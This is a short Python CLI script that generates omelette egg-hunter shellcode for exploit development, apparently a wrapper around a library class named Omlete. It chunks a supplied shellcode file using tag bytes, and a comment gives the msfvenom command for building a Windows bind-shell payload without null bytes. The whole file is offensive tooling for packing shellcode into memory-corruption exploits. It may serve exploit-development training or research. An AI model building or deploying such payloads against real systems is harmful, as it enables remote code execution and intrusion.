#!/usr/bin/python

import os
import sys
import argparse

from omlete import Omlete

if __name__ == '__main__':
	# msfvenom -p windows/shell_bind_tcp -b '\x00' -f raw > shell.bin
	parser = argparse.ArgumentParser(description="[+] omlete egg_hunter generator [+]")
	parser.add_argument('-s', action="store", help="shellcode file <shell.bin>",type=str)
	parser.add_argument('-c', action="store", help="chunk size", type=int)
	parser.add_argument('-p', action="store", help="choose padding size", type=int)
	parser.add_argument('-v', action="store", help="choose variable name", type=str)
	res = parser.parse_args()
	if res.s and res.c and res.p:
		om = Omlete(chunk_size=res.c, padding=res.p, tag=["\\x12", "\\x34", "\\x56", "\\x78"], shellcode=res.s, var_name=res.v)
		om.generate()
